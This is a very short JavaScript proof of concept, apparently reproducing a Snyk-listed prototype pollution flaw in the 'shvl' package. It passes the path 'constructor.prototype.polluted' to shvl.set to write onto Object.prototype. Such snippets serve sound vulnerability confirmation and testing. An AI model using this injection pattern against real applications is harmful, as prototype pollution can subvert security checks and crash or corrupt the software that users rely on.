//https://snyk.io/vuln/SNYK-JS-SHVL-1085284
var shvl = require("shvl")

shvl.set({}, 'constructor.prototype.polluted', 'yes')
  